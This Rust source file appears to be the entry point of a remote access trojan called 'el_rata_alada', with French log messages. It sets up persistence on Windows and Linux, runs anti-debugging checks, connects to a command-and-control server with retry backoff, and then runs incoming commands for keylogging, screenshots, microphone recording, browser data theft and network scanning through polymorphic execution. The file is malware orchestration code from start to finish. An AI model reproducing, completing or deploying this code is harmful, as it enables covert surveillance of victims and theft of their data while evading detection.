// #![windows_subsystem = "windows"]
mod anti_debug;
mod browser_info;
mod connexion;
mod input;
mod logs;
mod mic_rec;
mod network_scanner;
mod persistance;
mod poly;
mod screenshot;
mod shell;

use std::collections::HashSet;
use tokio::task::JoinHandle;
use single_instance::SingleInstance;
use tokio::io::AsyncReadExt;

#[tokio::main]
async fn main() {
    let instance: SingleInstance = SingleInstance::new("el_rata_alada").unwrap();
    if !instance.is_single() {
        return;
    }

    poly::init_polymorph_functions();

    #[cfg(target_os = "windows")]
    persistance::setup_persistence_lolbin();
    #[cfg(target_os = "linux")]
    persistance::setup_persistence_linux();


    anti_debug::anti_debug_response();
    
    // Retry C2 connection with exponential backoff
    let mut retry_count = 0;
    let max_retries = 30;
    let mut base_delay = std::time::Duration::from_secs(1);
    
    loop {
        match connexion::connect_to_c2().await {
            Ok(_) => {
                if retry_count > 0 {
                    println!("[+] Connecté au C2 après {} tentatives", retry_count);
                } else {
                    println!("[+] Connecté au C2");
                }
                break;
            }
            Err(e) => {
                retry_count += 1;
                if retry_count >= max_retries {
                    eprintln!("[-] Impossible de se connecter au C2 après {} tentatives: {}", max_retries, e);
                    return;
                }
                eprintln!("[-] Erreur connexion C2 (tentative {}): {}. Nouvelle tentative dans {:?}", retry_count, e, base_delay);
                tokio::time::sleep(base_delay).await;
                // Exponential backoff, max 60 seconds
                base_delay = std::time::Duration::from_secs((base_delay.as_secs() * 2).min(60));
            }
        }
    }
    
    println!("[+] En attente de commandes...");


    let num_to_command = [
        ("1", "keylogger"),
        ("2", "screenshot"),
        ("3", "logs"),
        ("4", "network_scan"),
        ("5", "browser_info"),
        ("6", "mic_rec"),
    ];

    loop {
        let mut buffer = vec![0; 8192];
        let mut socket_guard = connexion::TCP_SOCKET.lock().await;
        
        if let Some(socket) = &mut *socket_guard {
            match socket.read(&mut buffer).await {
                Ok(0) => {
                    eprintln!("[-] Connexion au serveur fermée");
                    drop(socket_guard);
                    break;
                }
                Ok(n) => {
                    let data = String::from_utf8_lossy(&buffer[..n]);
                    
                    if let Ok(json) = serde_json::from_str::<serde_json::Value>(&data) {
                        // Vérifie s'il y a une erreur du C2
                        if json.get("error").is_some() {
                            // Ignore les erreurs silencieusement
                            continue;
                        }
                        
                        if let Some(commands_array) = json.get("commands").and_then(|v| v.as_array()) {
                            let commands: Vec<String> = commands_array
                                .iter()
                                .filter_map(|v| v.as_str().map(String::from))
                                .collect();
                            
                            if !commands.is_empty() {
                                drop(socket_guard);
                                
                                println!("[+] Commandes reçues: {:?}", commands);
                                let mut handles: Vec<JoinHandle<()>> = Vec::new();
                                let mut already_in_queue: HashSet<String> = HashSet::new();
                                
                                for command in commands {
                                    if let Some(num) = command.strip_prefix("stop ") {
                                        if let Some((_, cmd_name)) = num_to_command.iter().find(|(n, _)| *n == num)
                                        {
                                            println!("[+] Arrêt demandé pour {}", cmd_name);
                                            if *cmd_name == "keylogger" {
                                                input::stop_keylogger();
                                            }
                                            if *cmd_name == "mic_rec" {
                                                mic_rec::stop_mic_rec();
                                            }
                                            let _ = connexion::send_directive_status(
                                                &format!("stop {}", num),
                                                "success",
                                                "Session terminée",
                                            )
                                            .await;
                                        }
                                        continue;
                                    }

                                    if already_in_queue.contains(&command) {
                                        continue;
                                    }

                                    already_in_queue.insert(command.clone());

                                    let cmd = command.clone();
                                    let handle = tokio::spawn(async move {
                                        poly::execute_poly_command(&cmd).await;
                                    });
                                    handles.push(handle);
                                }
                                for handle in handles {
                                    let _ = handle.await;
                                }
                            }
                        }
                    }
                }
                Err(e) => {
                    eprintln!("[-] Erreur lecture: {}", e);
                    drop(socket_guard);
                    break;
                }
            }
        }
    }
}
